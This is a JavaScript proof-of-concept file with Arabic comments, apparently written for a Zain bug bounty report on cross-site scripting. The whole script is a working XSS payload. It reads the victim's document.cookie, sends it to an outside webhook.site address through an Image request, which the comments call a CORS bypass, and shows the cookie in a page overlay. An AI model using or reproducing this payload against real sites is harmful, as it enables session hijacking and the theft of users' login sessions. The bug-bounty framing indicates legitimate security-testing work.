// poc.js - ZAIN BUG BOUNTY CRITICAL XSS + SESSION HIJACKING
(() => {
  if (window.pocExecuted) return;
  window.pocExecuted = true;

  // 1. تنبيه واضح
  alert("PWNED BY @majorksa - ZAIN BUG BOUNTY");

  // 2. استخراج الكوكيز
  const cookie = document.cookie;
  console.log("[PWNED] Full Cookie:", cookie);

  // 3. تجاوز CORS بـ Image (يعمل 100%)
  const img = new Image();
  img.src = 'https://webhook.site/XXXX-XXXX-XXXX-XXXX?cookie=' + encodeURIComponent(cookie);
  console.log("[PWNED] Cookie sent via Image (CORS bypass)");

  // 4. إظهار الكوكيز في DOM (دليل بصري)
  const div = document.createElement('div');
  div.style.position = 'fixed';
  div.style.bottom = '10px';
  div.style.left = '10px';
  div.style.background = 'red';
  div.style.color = 'white';
  div.style.padding = '10px';
  div.style.zIndex = '9999';
  div.innerHTML = '<strong>PWNED!</strong> Cookie: ' + cookie.substring(0, 50) + '...';
  document.body.appendChild(div);
})();
